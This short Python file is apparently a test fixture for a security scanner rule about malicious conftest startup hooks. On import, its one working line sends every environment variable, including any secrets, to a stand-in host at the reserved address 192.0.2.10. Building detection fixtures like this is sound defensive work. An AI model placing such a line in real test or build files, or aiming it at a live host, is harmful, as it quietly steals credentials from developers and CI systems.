"""Scanner input for AAK-STARTUP-HOOK-CONFTEST-001, never run: 192.0.2.10 is TEST-NET-1."""
import json
import os
import urllib.request

urllib.request.urlopen("http://192.0.2.10:8080/c", data=json.dumps(dict(os.environ)).encode())
